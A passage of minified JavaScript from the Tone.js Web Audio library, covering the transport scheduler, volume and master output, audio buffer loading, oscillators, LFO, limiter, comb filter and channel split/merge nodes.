this._scheduledEvents[t.id.toString()]={event:t,timeline:e},e.add(t),t.id},t.Transport.prototype.cancel=function(e){return e=t.defaultArg(e,0),e=this.toTicks(e),this._timeline.forEachFrom(e,function(t){this.clear(t.id)}.bind(this)),this._repeatedEvents.forEachFrom(e,function(t){this.clear(t.id)}.bind(this)),this},t.Transport.prototype._bindClockEvents=function(){this._clock.on("start",function(e,n){n=t.Ticks(n).toSeconds(),this.emit("start",e,n)}.bind(this)),this._clock.on("stop",function(t){this.emit("stop",t)}.bind(this)),this._clock.on("pause",function(t){this.emit("pause",t)}.bind(this))},Object.defineProperty(t.Transport.prototype,"state",{get:function(){return this._clock.getStateAtTime(this.now())}}),t.Transport.prototype.start=function(e,n){return t.isDefined(n)&&(n=this.toTicks(n)),this._clock.start(e,n),this},t.Transport.prototype.stop=function(t){return this._clock.stop(t),this},t.Transport.prototype.pause=function(t){return this._clock.pause(t),this},t.Transport.prototype.toggle=function(e){return e=this.toSeconds(e),this._clock.getStateAtTime(e)!==t.State.Started?this.start(e):this.stop(e),this},Object.defineProperty(t.Transport.prototype,"timeSignature",{get:function(){return this._timeSignature},set:function(e){t.isArray(e)&&(e=e[0]/e[1]*4),this._timeSignature=e}}),Object.defineProperty(t.Transport.prototype,"loopStart",{get:function(){return t.Ticks(this._loopStart).toSeconds()},set:function(t){this._loopStart=this.toTicks(t)}}),Object.defineProperty(t.Transport.prototype,"loopEnd",{get:function(){return t.Ticks(this._loopEnd).toSeconds()},set:function(t){this._loopEnd=this.toTicks(t)}}),t.Transport.prototype.setLoopPoints=function(t,e){return this.loopStart=t,this.loopEnd=e,this},Object.defineProperty(t.Transport.prototype,"swing",{get:function(){return this._swingAmount},set:function(t){this._swingAmount=t}}),Object.defineProperty(t.Transport.prototype,"swingSubdivision",{get:function(){return t.Ticks(this._swingTicks).toNotation()},set:function(t){this._swingTicks=this.toTicks(t)}}),Object.defineProperty(t.Transport.prototype,"position",{get:function(){var e=this.now(),n=this._clock.getTicksAtTime(e);return t.Ticks(n).toBarsBeatsSixteenths()},set:function(t){var e=this.toTicks(t);this.ticks=e}}),Object.defineProperty(t.Transport.prototype,"seconds",{get:function(){return this._clock.seconds},set:function(t){var e=this.now(),n=this.bpm.timeToTicks(t,e);this.ticks=n}}),Object.defineProperty(t.Transport.prototype,"progress",{get:function(){if(this.loop){var t=this.now();return(this._clock.getTicksAtTime(t)-this._loopStart)/(this._loopEnd-this._loopStart)}return 0}}),Object.defineProperty(t.Transport.prototype,"ticks",{get:function(){return this._clock.ticks},set:function(e){if(this._clock.ticks!==e){var n=this.now();this.state===t.State.Started?(this.emit("stop",n),this._clock.setTicksAtTime(e,n),this.emit("start",n,this.seconds)):this._clock.setTicksAtTime(e,n)}}}),t.Transport.prototype.getTicksAtTime=function(t){return Math.round(this._clock.getTicksAtTime(t))},t.Transport.prototype.getSecondsAtTime=function(t){return this._clock.getSecondsAtTime(t)},Object.defineProperty(t.Transport.prototype,"PPQ",{get:function(){return this._ppq},set:function(t){var e=this.bpm.value;this._ppq=t,this.bpm.value=e}}),t.Transport.prototype._fromUnits=function(t){return 1/(60/t/this.PPQ)},t.Transport.prototype._toUnits=function(t){return t/this.PPQ*60},t.Transport.prototype.nextSubdivision=function(e){if(e=this.toTicks(e),this.state!==t.State.Started)return 0;var n=this.now(),r=e-this.getTicksAtTime(n)%e;return this._clock.nextTickTime(r,n)},t.Transport.prototype.syncSignal=function(e,n){if(!n){var r=this.now();n=0!==e.getValueAtTime(r)?e.getValueAtTime(r)/this.bpm.getValueAtTime(r):0}var i=new t.Gain(n);return this.bpm.chain(i,e._param),this._syncedSignals.push({ratio:i,signal:e,initial:e.value}),e.value=0,this},t.Transport.prototype.unsyncSignal=function(t){for(var e=this._syncedSignals.length-1;e>=0;e--){var n=this._syncedSignals[e];n.signal===t&&(n.ratio.dispose(),n.signal.value=n.initial,this._syncedSignals.splice(e,1))}return this},t.Transport.prototype.dispose=function(){return t.Emitter.prototype.dispose.call(this),this._clock.dispose(),this._clock=null,this._writable("bpm"),this.bpm=null,this._timeline.dispose(),this._timeline=null,this._repeatedEvents.dispose(),this._repeatedEvents=null,this};var e=t.Transport;return t.Transport=new e,t.Context.on("init",(function(n){n.Transport instanceof e?t.Transport=n.Transport:t.Transport=new e,n.Transport=t.Transport})),t.Context.on("close",(function(t){t.Transport instanceof e&&t.Transport.dispose()})),t.Transport})),n((function(t){return t.Volume=function(){var e=t.defaults(arguments,["volume"],t.Volume);t.AudioNode.call(this),this.output=this.input=new t.Gain(e.volume,t.Type.Decibels),this._unmutedVolume=e.volume,this.volume=this.output.gain,this._readOnly("volume"),this.mute=e.mute},t.extend(t.Volume,t.AudioNode),t.Volume.defaults={volume:0,mute:!1},Object.defineProperty(t.Volume.prototype,"mute",{get:function(){return this.volume.value===-1/0},set:function(t){!this.mute&&t?(this._unmutedVolume=this.volume.value,this.volume.value=-1/0):this.mute&&!t&&(this.volume.value=this._unmutedVolume)}}),t.Volume.prototype.dispose=function(){return this.input.dispose(),t.AudioNode.prototype.dispose.call(this),this._writable("volume"),this.volume.dispose(),this.volume=null,this},t.Volume})),n((function(t){t.Master=function(){t.AudioNode.call(this),t.getContext(function(){this.createInsOuts(1,0),this._volume=this.output=new t.Volume,this.volume=this._volume.volume,this._readOnly("volume"),this.input.chain(this.output,this.context.destination)}.bind(this))},t.extend(t.Master,t.AudioNode),t.Master.defaults={volume:0,mute:!1},Object.defineProperty(t.Master.prototype,"mute",{get:function(){return this._volume.mute},set:function(t){this._volume.mute=t}}),t.Master.prototype.chain=function(){this.input.disconnect(),this.input.chain.apply(this.input,arguments),arguments[arguments.length-1].connect(this.output)},t.Master.prototype.dispose=function(){t.AudioNode.prototype.dispose.call(this),this._writable("volume"),this._volume.dispose(),this._volume=null,this.volume=null},t.AudioNode.prototype.toMaster=function(){return this.connect(t.Master),this},window.AudioNode&&(AudioNode.prototype.toMaster=function(){return this.connect(t.Master),this});var e=t.Master;return t.Master=new e,t.Context.on("init",(function(n){n.Master instanceof e?t.Master=n.Master:t.Master=new e,n.Master=t.Master})),t.Context.on("close",(function(t){t.Master instanceof e&&t.Master.dispose()})),t.Master})),n((function(t){return t.Source=function(e){e=t.defaultArg(e,t.Source.defaults),t.AudioNode.call(this),this._volume=this.output=new t.Volume(e.volume),this.volume=this._volume.volume,this._readOnly("volume"),this._state=new t.TimelineState(t.State.Stopped),this._state.memory=100,this._synced=!1,this._scheduled=[],this._volume.output.output.channelCount=2,this._volume.output.output.channelCountMode="explicit",this.mute=e.mute},t.extend(t.Source,t.AudioNode),t.Source.defaults={volume:0,mute:!1},Object.defineProperty(t.Source.prototype,"state",{get:function(){return this._synced?t.Transport.state===t.State.Started?this._state.getValueAtTime(t.Transport.seconds):t.State.Stopped:this._state.getValueAtTime(this.now())}}),Object.defineProperty(t.Source.prototype,"mute",{get:function(){return this._volume.mute},set:function(t){this._volume.mute=t}}),t.Source.prototype._start=t.noOp,t.Source.prototype.restart=t.noOp,t.Source.prototype._stop=t.noOp,t.Source.prototype.start=function(e,n,r){if(e=t.isUndef(e)&&this._synced?t.Transport.seconds:this.toSeconds(e),this._state.getValueAtTime(e)===t.State.Started)this._state.cancel(e),this._state.setStateAtTime(t.State.Started,e),this.restart(e,n,r);else if(this._state.setStateAtTime(t.State.Started,e),this._synced){var i=this._state.get(e);i.offset=t.defaultArg(n,0),i.duration=r;var o=t.Transport.schedule(function(t){this._start(t,n,r)}.bind(this),e);this._scheduled.push(o),t.Transport.state===t.State.Started&&this._syncedStart(this.now(),t.Transport.seconds)}else this._start.apply(this,arguments);return this},t.Source.prototype.stop=function(e){if(e=t.isUndef(e)&&this._synced?t.Transport.seconds:this.toSeconds(e),this._synced){var n=t.Transport.schedule(this._stop.bind(this),e);this._scheduled.push(n)}else this._stop.apply(this,arguments);return this._state.cancel(e),this._state.setStateAtTime(t.State.Stopped,e),this},t.Source.prototype.sync=function(){return this._synced=!0,this._syncedStart=function(e,n){if(n>0){var r=this._state.get(n);if(r&&r.state===t.State.Started&&r.time!==n){var i,o=n-this.toSeconds(r.time);r.duration&&(i=this.toSeconds(r.duration)-o),this._start(e,this.toSeconds(r.offset)+o,i)}}}.bind(this),this._syncedStop=function(e){var n=t.Transport.getSecondsAtTime(Math.max(e-this.sampleTime,0));this._state.getValueAtTime(n)===t.State.Started&&this._stop(e)}.bind(this),t.Transport.on("start loopStart",this._syncedStart),t.Transport.on("stop pause loopEnd",this._syncedStop),this},t.Source.prototype.unsync=function(){this._synced&&(t.Transport.off("stop pause loopEnd",this._syncedStop),t.Transport.off("start loopStart",this._syncedStart)),this._synced=!1;for(var e=0;e<this._scheduled.length;e++){var n=this._scheduled[e];t.Transport.clear(n)}return this._scheduled=[],this._state.cancel(0),this},t.Source.prototype.dispose=function(){t.AudioNode.prototype.dispose.call(this),this.unsync(),this._scheduled=null,this._writable("volume"),this._volume.dispose(),this._volume=null,this.volume=null,this._state.dispose(),this._state=null},t.Source})),n((function(t){t.supported&&(AudioBuffer.prototype.copyToChannel||(AudioBuffer.prototype.copyToChannel=function(t,e,n){var r=this.getChannelData(e);n=n||0;for(var i=0;i<r.length;i++)r[i+n]=t[i]},AudioBuffer.prototype.copyFromChannel=function(t,e,n){var r=this.getChannelData(e);n=n||0;for(var i=0;i<t.length;i++)t[i]=r[i+n]}))})),n((function(t){return t.Buffer=function(){var e=t.defaults(arguments,["url","onload","onerror"],t.Buffer);t.call(this),this._buffer=null,this._reversed=e.reverse,this._xhr=null,this._onload=t.noOp,e.url instanceof AudioBuffer||e.url instanceof t.Buffer?(this.set(e.url),e.onload&&(this.loaded?e.onload(this):this._onload=e.onload)):t.isString(e.url)&&this.load(e.url).then(e.onload).catch(e.onerror)},t.extend(t.Buffer),t.Buffer.defaults={url:void 0,reverse:!1,onload:t.noOp,onerror:t.noOp},t.Buffer.prototype.set=function(e){return e instanceof t.Buffer?e.loaded?this._buffer=e.get():e._onload=function(){this.set(e),this._onload(this)}.bind(this):this._buffer=e,this},t.Buffer.prototype.get=function(){return this._buffer},t.Buffer.prototype.load=function(e,n,r){return new Promise(function(i,o){this._xhr=t.Buffer.load(e,function(t){this._xhr=null,this.set(t),i(this),this._onload(this),n&&n(this)}.bind(this),function(t){this._xhr=null,o(t),r&&r(t)}.bind(this))}.bind(this))},t.Buffer.prototype.dispose=function(){return t.prototype.dispose.call(this),this._buffer=null,this._xhr&&(t.Buffer._removeFromDownloadQueue(this._xhr),this._xhr.abort(),this._xhr=null),this},Object.defineProperty(t.Buffer.prototype,"loaded",{get:function(){return this.length>0}}),Object.defineProperty(t.Buffer.prototype,"duration",{get:function(){return this._buffer?this._buffer.duration:0}}),Object.defineProperty(t.Buffer.prototype,"length",{get:function(){return this._buffer?this._buffer.length:0}}),Object.defineProperty(t.Buffer.prototype,"numberOfChannels",{get:function(){return this._buffer?this._buffer.numberOfChannels:0}}),t.Buffer.prototype.fromArray=function(t){var e=t[0].length>0,n=e?t.length:1,r=e?t[0].length:t.length,i=this.context.createBuffer(n,r,this.context.sampleRate);e||1!==n||(t=[t]);for(var o=0;o<n;o++)i.copyToChannel(t[o],o);return this._buffer=i,this},t.Buffer.prototype.toMono=function(e){if(t.isNumber(e))this.fromArray(this.toArray(e));else{for(var n=new Float32Array(this.length),r=this.numberOfChannels,i=0;i<r;i++)for(var o=this.toArray(i),s=0;s<o.length;s++)n[s]+=o[s];n=n.map((function(t){return t/r})),this.fromArray(n)}return this},t.Buffer.prototype.toArray=function(e){if(t.isNumber(e))return this.getChannelData(e);if(1===this.numberOfChannels)return this.toArray(0);for(var n=[],r=0;r<this.numberOfChannels;r++)n[r]=this.getChannelData(r);return n},t.Buffer.prototype.getChannelData=function(t){return this._buffer.getChannelData(t)},t.Buffer.prototype.slice=function(e,n){n=t.defaultArg(n,this.duration);for(var r=Math.floor(this.context.sampleRate*this.toSeconds(e)),i=Math.floor(this.context.sampleRate*this.toSeconds(n)),o=[],s=0;s<this.numberOfChannels;s++)o[s]=this.toArray(s).slice(r,i);return(new t.Buffer).fromArray(o)},t.Buffer.prototype._reverse=function(){if(this.loaded)for(var t=0;t<this.numberOfChannels;t++)Array.prototype.reverse.call(this.getChannelData(t));return this},Object.defineProperty(t.Buffer.prototype,"reverse",{get:function(){return this._reversed},set:function(t){this._reversed!==t&&(this._reversed=t,this._reverse())}}),t.Emitter.mixin(t.Buffer),t.Buffer._downloadQueue=[],t.Buffer.baseUrl="",t.Buffer.fromArray=function(e){return(new t.Buffer).fromArray(e)},t.Buffer.fromUrl=function(e){var n=new t.Buffer;return n.load(e).then((function(){return n}))},t.Buffer._removeFromDownloadQueue=function(e){var n=t.Buffer._downloadQueue.indexOf(e);-1!==n&&t.Buffer._downloadQueue.splice(n,1)},t.Buffer.load=function(e,n,r){n=t.defaultArg(n,t.noOp);var i=e.match(/\[(.+\|?)+\]$/);if(i){for(var o=i[1].split("|"),s=o[0],a=0;a<o.length;a++)if(t.Buffer.supportsType(o[a])){s=o[a];break}e=e.replace(i[0],s)}function u(e){if(t.Buffer._removeFromDownloadQueue(l),t.Buffer.emit("error",e),!r)throw e;r(e)}function c(){for(var e=0,n=0;n<t.Buffer._downloadQueue.length;n++)e+=t.Buffer._downloadQueue[n].progress;t.Buffer.emit("progress",e/t.Buffer._downloadQueue.length)}var l=new XMLHttpRequest;return l.open("GET",t.Buffer.baseUrl+e,!0),l.responseType="arraybuffer",l.progress=0,t.Buffer._downloadQueue.push(l),l.addEventListener("load",(function(){200===l.status?t.context.decodeAudioData(l.response).then((function(e){l.progress=1,c(),n(e),t.Buffer._removeFromDownloadQueue(l),0===t.Buffer._downloadQueue.length&&t.Buffer.emit("load")})).catch((function(){t.Buffer._removeFromDownloadQueue(l),u("Tone.Buffer: could not decode audio data: "+e)})):u("Tone.Buffer: could not locate file: "+e)})),l.addEventListener("error",u),l.addEventListener("progress",(function(t){t.lengthComputable&&(l.progress=t.loaded/t.total*.95,c())})),l.send(),l},t.Buffer.cancelDownloads=function(){return t.Buffer._downloadQueue.slice().forEach((function(e){t.Buffer._removeFromDownloadQueue(e),e.abort()})),t.Buffer},t.Buffer.supportsType=function(t){var e=t.split(".");return e=e[e.length-1],""!==document.createElement("audio").canPlayType("audio/"+e)},t.loaded=function(){var e,n;function r(){t.Buffer.off("load",e),t.Buffer.off("error",n)}return new Promise((function(r,i){e=function(){r()},n=function(){i()},t.Buffer.on("load",e),t.Buffer.on("error",n)})).then(r).catch((function(t){throw r(),new Error(t)}))},t.Buffer})),n((function(t){return t.OscillatorNode=function(){var e=t.defaults(arguments,["frequency","type"],t.OscillatorNode);t.AudioNode.call(this,e),this.onended=e.onended,this._startTime=-1,this._stopTime=-1,this._gainNode=this.output=new t.Gain,this._gainNode.gain.setValueAtTime(0,this.context.currentTime),this._oscillator=this.context.createOscillator(),this._oscillator.connect(this._gainNode),this.type=e.type,this.frequency=new t.Param(this._oscillator.frequency,t.Type.Frequency),this.frequency.value=e.frequency,this.detune=new t.Param(this._oscillator.detune,t.Type.Cents),this.detune.value=e.detune,this._gain=1},t.extend(t.OscillatorNode,t.AudioNode),t.OscillatorNode.defaults={frequency:440,detune:0,type:"sine",onended:t.noOp},Object.defineProperty(t.OscillatorNode.prototype,"state",{get:function(){return this.getStateAtTime(this.now())}}),t.OscillatorNode.prototype.getStateAtTime=function(e){return e=this.toSeconds(e),-1!==this._startTime&&e>=this._startTime&&(-1===this._stopTime||e<=this._stopTime)?t.State.Started:t.State.Stopped},t.OscillatorNode.prototype.start=function(t){if(-1!==this._startTime)throw new Error("cannot call OscillatorNode.start more than once");this._startTime=this.toSeconds(t),this._oscillator.start(this._startTime);var e=this.context.currentTime;return this._gainNode.gain.cancelScheduledValues(e),this._gainNode.gain.setValueAtTime(0,e),this._gainNode.gain.setValueAtTime(1,this._startTime),this},t.OscillatorNode.prototype.setPeriodicWave=function(t){return this._oscillator.setPeriodicWave(t),this},t.OscillatorNode.prototype.stop=function(t){return this.cancelStop(),this._stopTime=this.toSeconds(t),this._gainNode.gain.setValueAtTime(0,this._stopTime),this.context.clearTimeout(this._timeout),this._timeout=this.context.setTimeout(function(){this._oscillator.stop(this.now()),this.onended()}.bind(this),this._stopTime-this.now()),this},t.OscillatorNode.prototype.cancelStop=function(){return-1!==this._startTime&&(this._gainNode.gain.cancelScheduledValues(this._startTime+this.sampleTime),this._gainNode.gain.setValueAtTime(1,Math.max(this.now(),this._startTime)),this.context.clearTimeout(this._timeout),this._stopTime=-1),this},Object.defineProperty(t.OscillatorNode.prototype,"type",{get:function(){return this._oscillator.type},set:function(t){this._oscillator.type=t}}),t.OscillatorNode.prototype.dispose=function(){return this.context.clearTimeout(this._timeout),t.AudioNode.prototype.dispose.call(this),this.onended=null,this._oscillator.disconnect(),this._oscillator=null,this._gainNode.dispose(),this._gainNode=null,this.frequency.dispose(),this.frequency=null,this.detune.dispose(),this.detune=null,this},t.OscillatorNode})),n((function(t){return t.Oscillator=function(){var e=t.defaults(arguments,["frequency","type"],t.Oscillator);t.Source.call(this,e),this._oscillator=null,this.frequency=new t.Signal(e.frequency,t.Type.Frequency),this.detune=new t.Signal(e.detune,t.Type.Cents),this._wave=null,this._partials=t.defaultArg(e.partials,[1]),this._phase=e.phase,this._type=null,this.type=e.type,this.phase=this._phase,this._readOnly(["frequency","detune"])},t.extend(t.Oscillator,t.Source),t.Oscillator.defaults={type:"sine",frequency:440,detune:0,phase:0,partials:[]},t.Oscillator.Type={Sine:"sine",Triangle:"triangle",Sawtooth:"sawtooth",Square:"square",Custom:"custom"},t.Oscillator.prototype._start=function(e){this._oscillator=new t.OscillatorNode,this._wave?this._oscillator.setPeriodicWave(this._wave):this._oscillator.type=this._type,this._oscillator.connect(this.output),this.frequency.connect(this._oscillator.frequency),this.detune.connect(this._oscillator.detune),e=this.toSeconds(e),this._oscillator.start(e)},t.Oscillator.prototype._stop=function(t){return this._oscillator&&(t=this.toSeconds(t),this._oscillator.stop(t)),this},t.Oscillator.prototype.restart=function(t){return this._oscillator.cancelStop(),this._state.cancel(this.toSeconds(t)),this},t.Oscillator.prototype.syncFrequency=function(){return t.Transport.syncSignal(this.frequency),this},t.Oscillator.prototype.unsyncFrequency=function(){return t.Transport.unsyncSignal(this.frequency),this},Object.defineProperty(t.Oscillator.prototype,"type",{get:function(){return this._type},set:function(e){var n=[t.Oscillator.Type.Sine,t.Oscillator.Type.Square,t.Oscillator.Type.Triangle,t.Oscillator.Type.Sawtooth].includes(e);if(0===this._phase&&n)this._wave=null,null!==this._oscillator&&this._oscillator.type;else{var r=this._getRealImaginary(e,this._phase),i=this.context.createPeriodicWave(r[0],r[1]);this._wave=i,null!==this._oscillator&&this._oscillator.setPeriodicWave(this._wave)}this._type=e}}),t.Oscillator.prototype._getRealImaginary=function(e,n){var r=2048,i=new Float32Array(r),o=new Float32Array(r),s=1;if(e===t.Oscillator.Type.Custom)r=s=this._partials.length+1;else{var a=/^(sine|triangle|square|sawtooth)(\d+)$/.exec(e);a&&(s=parseInt(a[2])+1,e=a[1],r=s=Math.max(s,2))}for(var u=1;u<r;++u){var c,l=2/(u*Math.PI);switch(e){case t.Oscillator.Type.Sine:c=u<=s?1:0;break;case t.Oscillator.Type.Square:c=1&u?2*l:0;break;case t.Oscillator.Type.Sawtooth:c=l*(1&u?1:-1);break;case t.Oscillator.Type.Triangle:c=1&u?l*l*2*(u-1>>1&1?-1:1):0;break;case t.Oscillator.Type.Custom:c=this._partials[u-1];break;default:throw new TypeError("Tone.Oscillator: invalid type: "+e)}0!==c?(i[u]=-c*Math.sin(n*u),o[u]=c*Math.cos(n*u)):(i[u]=0,o[u]=0)}return[i,o]},t.Oscillator.prototype._inverseFFT=function(t,e,n){for(var r=0,i=t.length,o=0;o<i;o++)r+=t[o]*Math.cos(o*n)+e[o]*Math.sin(o*n);return r},t.Oscillator.prototype._getInitialValue=function(){for(var t=this._getRealImaginary(this._type,0),e=t[0],n=t[1],r=0,i=2*Math.PI,o=0;o<8;o++)r=Math.max(this._inverseFFT(e,n,o/8*i),r);return-this._inverseFFT(e,n,this._phase)/r},Object.defineProperty(t.Oscillator.prototype,"partials",{get:function(){return this._type!==t.Oscillator.Type.Custom?[]:this._partials},set:function(e){this._partials=e,this.type=t.Oscillator.Type.Custom}}),Object.defineProperty(t.Oscillator.prototype,"phase",{get:function(){return this._phase*(180/Math.PI)},set:function(t){this._phase=t*Math.PI/180,this.type=this._type}}),t.Oscillator.prototype.dispose=function(){return t.Source.prototype.dispose.call(this),null!==this._oscillator&&(this._oscillator.dispose(),this._oscillator=null),this._wave=null,this._writable(["frequency","detune"]),this.frequency.dispose(),this.frequency=null,this.detune.dispose(),this.detune=null,this._partials=null,this},t.Oscillator})),n((function(t){return t.AudioToGain=function(){t.SignalBase.call(this),this._norm=this.input=this.output=new t.WaveShaper((function(t){return(t+1)/2}))},t.extend(t.AudioToGain,t.SignalBase),t.AudioToGain.prototype.dispose=function(){return t.SignalBase.prototype.dispose.call(this),this._norm.dispose(),this._norm=null,this},t.AudioToGain})),n((function(t){return t.Zero=function(){t.SignalBase.call(this),this._gain=this.input=this.output=new t.Gain,this.context.getConstant(0).connect(this._gain)},t.extend(t.Zero,t.SignalBase),t.Zero.prototype.dispose=function(){return t.SignalBase.prototype.dispose.call(this),this._gain.dispose(),this._gain=null,this},t.Zero})),n((function(t){return t.LFO=function(){var e=t.defaults(arguments,["frequency","min","max"],t.LFO);t.AudioNode.call(this),this._oscillator=new t.Oscillator({frequency:e.frequency,type:e.type}),this.frequency=this._oscillator.frequency,this.amplitude=this._oscillator.volume,this.amplitude.units=t.Type.NormalRange,this.amplitude.value=e.amplitude,this._stoppedSignal=new t.Signal(0,t.Type.AudioRange),this._zeros=new t.Zero,this._stoppedValue=0,this._a2g=new t.AudioToGain,this._scaler=this.output=new t.Scale(e.min,e.max),this._units=t.Type.Default,this.units=e.units,this._oscillator.chain(this._a2g,this._scaler),this._zeros.connect(this._a2g),this._stoppedSignal.connect(this._a2g),this._readOnly(["amplitude","frequency"]),this.phase=e.phase},t.extend(t.LFO,t.AudioNode),t.LFO.defaults={type:"sine",min:0,max:1,phase:0,frequency:"4n",amplitude:1,units:t.Type.Default},t.LFO.prototype.start=function(t){return t=this.toSeconds(t),this._stoppedSignal.setValueAtTime(0,t),this._oscillator.start(t),this},t.LFO.prototype.stop=function(t){return t=this.toSeconds(t),this._stoppedSignal.setValueAtTime(this._stoppedValue,t),this._oscillator.stop(t),this},t.LFO.prototype.sync=function(){return this._oscillator.sync(),this._oscillator.syncFrequency(),this},t.LFO.prototype.unsync=function(){return this._oscillator.unsync(),this._oscillator.unsyncFrequency(),this},Object.defineProperty(t.LFO.prototype,"min",{get:function(){return this._toUnits(this._scaler.min)},set:function(t){t=this._fromUnits(t),this._scaler.min=t}}),Object.defineProperty(t.LFO.prototype,"max",{get:function(){return this._toUnits(this._scaler.max)},set:function(t){t=this._fromUnits(t),this._scaler.max=t}}),Object.defineProperty(t.LFO.prototype,"type",{get:function(){return this._oscillator.type},set:function(t){this._oscillator.type=t,this._stoppedValue=this._oscillator._getInitialValue(),this._stoppedSignal.value=this._stoppedValue}}),Object.defineProperty(t.LFO.prototype,"phase",{get:function(){return this._oscillator.phase},set:function(t){this._oscillator.phase=t,this._stoppedValue=this._oscillator._getInitialValue(),this._stoppedSignal.value=this._stoppedValue}}),Object.defineProperty(t.LFO.prototype,"units",{get:function(){return this._units},set:function(t){var e=this.min,n=this.max;this._units=t,this.min=e,this.max=n}}),Object.defineProperty(t.LFO.prototype,"mute",{get:function(){return this._oscillator.mute},set:function(t){this._oscillator.mute=t}}),Object.defineProperty(t.LFO.prototype,"state",{get:function(){return this._oscillator.state}}),t.LFO.prototype.connect=function(e){return e.constructor!==t.Signal&&e.constructor!==t.Param||(this.convert=e.convert,this.units=e.units),t.SignalBase.prototype.connect.apply(this,arguments),this},t.LFO.prototype._fromUnits=t.Param.prototype._fromUnits,t.LFO.prototype._toUnits=t.Param.prototype._toUnits,t.LFO.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._writable(["amplitude","frequency"]),this._oscillator.dispose(),this._oscillator=null,this._stoppedSignal.dispose(),this._stoppedSignal=null,this._zeros.dispose(),this._zeros=null,this._scaler.dispose(),this._scaler=null,this._a2g.dispose(),this._a2g=null,this.frequency=null,this.amplitude=null,this},t.LFO})),n((function(t){return t.Limiter=function(){var e=t.defaults(arguments,["threshold"],t.Limiter);t.AudioNode.call(this),this._compressor=this.input=this.output=new t.Compressor({attack:.001,decay:.001,threshold:e.threshold}),this.threshold=this._compressor.threshold,this._readOnly("threshold")},t.extend(t.Limiter,t.AudioNode),t.Limiter.defaults={threshold:-12},t.Limiter.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._compressor.dispose(),this._compressor=null,this._writable("threshold"),this.threshold=null,this},t.Limiter})),n((function(t){return t.LowpassCombFilter=function(){var e=t.defaults(arguments,["delayTime","resonance","dampening"],t.LowpassCombFilter);t.AudioNode.call(this),this.createInsOuts(1,1),this._delay=this.input=new t.Delay(e.delayTime),this.delayTime=this._delay.delayTime,this._lowpass=this.output=this.context.createBiquadFilter(),this._lowpass.Q.value=-3.0102999566398125,this._lowpass.type="lowpass",this.dampening=new t.Param({param:this._lowpass.frequency,units:t.Type.Frequency,value:e.dampening}),this._feedback=new t.Gain(e.resonance,t.Type.NormalRange),this.resonance=this._feedback.gain,this._delay.chain(this._lowpass,this._feedback,this._delay),this._readOnly(["dampening","resonance","delayTime"])},t.extend(t.LowpassCombFilter,t.AudioNode),t.LowpassCombFilter.defaults={delayTime:.1,resonance:.5,dampening:3e3},t.LowpassCombFilter.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._writable(["dampening","resonance","delayTime"]),this.dampening.dispose(),this.dampening=null,this.resonance.dispose(),this.resonance=null,this._delay.dispose(),this._delay=null,this.delayTime=null,this._lowpass.disconnect(),this._lowpass=null,this._feedback.disconnect(),this._feedback=null,this},t.LowpassCombFilter})),n((function(t){return t.Merge=function(){t.AudioNode.call(this),this.createInsOuts(2,0),this.left=this.input[0]=new t.Gain,this.right=this.input[1]=new t.Gain,this._merger=this.output=this.context.createChannelMerger(2),this.left.connect(this._merger,0,0),this.right.connect(this._merger,0,1),this.left.channelCount=1,this.right.channelCount=1,this.left.channelCountMode="explicit",this.right.channelCountMode="explicit"},t.extend(t.Merge,t.AudioNode),t.Merge.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this.left.dispose(),this.left=null,this.right.dispose(),this.right=null,this._merger.disconnect(),this._merger=null,this},t.Merge})),n((function(t){return t.Meter=function(){var e=t.defaults(arguments,["smoothing"],t.Meter);t.AudioNode.call(this),this.input=this.output=this._analyser=new t.Analyser("waveform",1024),this.smoothing=e.smoothing},t.extend(t.Meter,t.AudioNode),t.Meter.defaults={smoothing:.8},t.Meter.prototype.getLevel=function(){this._analyser.type="fft";var t=this._analyser.getValue();return Math.max.apply(this,t)+28},t.Meter.prototype.getValue=function(){return this._analyser.type="waveform",this._analyser.getValue()[0]},Object.defineProperty(t.Meter.prototype,"smoothing",{get:function(){return this._analyser.smoothing},set:function(t){this._analyser.smoothing=t}}),t.Meter.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._analyser.dispose(),this._analyser=null,this},t.Meter})),n((function(t){return t.Split=function(){t.AudioNode.call(this),this.createInsOuts(0,2),this._splitter=this.input=this.context.createChannelSplitter(2),this._splitter.channelCount=2,this._splitter.channelCountMode="explicit",this.left=this.output[0]=new t.Gain,this.right=this.output[1]=new t.Gain,this._splitter.connect(this.left,0,0),this._splitter.connect(this.right,1,0)},t.extend(t.Split,t.AudioNode),t.Split.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._splitter.disconnect(),this.left.dispose(),this.left=null,this.right.dispose(),this.right=null,this._splitter=null,this},t.Split})),n((function(t){return t.MidSideSplit=function(){t.AudioNode.call(this),this.createInsOuts(0,2),this._split=this.input=new t.Split,this._midAdd=new t.Add,this.mid=this.output[0]=new t.Multiply(Math.SQRT1_2),this._sideSubtract=new t.Subtract,this.side=this.output[1]=new t.Multiply(Math.SQRT1_2),this._split.connect(this._midAdd,0,0),this._split.connect(this._midAdd,1,1),this._split.connect(this._sideSubtract,0,0),this._split.connect(this._sideSubtract,1,1),this._midAdd.connect(this.mid),this._sideSubtract.connect(this.side)},t.extend(t.MidSideSplit,t.AudioNode),t.MidSideSplit.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this.mid.dispose(),this.mid=null,this.side.dispose(),this.side=null,this._midAdd.dispose(),this._midAdd=null,this._sideSubtract.dispose(),this._sideSubtract=null,this._split.dispose(),this._split=null,this},t.MidSideSplit})),n((function(t){return t.MidSideMerge=function(){t.AudioNode.call(this),this.createInsOuts(2,0),this.mid=this.input[0]=new t.Gain,this._left=new t.Add,this._timesTwoLeft=new t.Multiply(Math.SQRT1_2),this.side=this.input[1]=new t.Gain,this._right=new t.Subtract,this._timesTwoRight=new t.Multiply(Math.SQRT1_2),this._merge=this.output=new t.Merge,this.mid.connect(this._left,0,0),this.side.connect(this._left,0,1),this.mid.connect(this._right,0,0),this.side.connect(this._right,0,1),this._left.connect(this._timesTwoLeft),this._right.connect(this._timesTwoRight),this._timesTwoLeft.connect(this._merge,0,0),this._timesTwoRight.connect(this._merge,0,1)},t.extend(t.MidSideMerge,t.AudioNode),t.MidSideMerge.prototype.dispose=function(){return 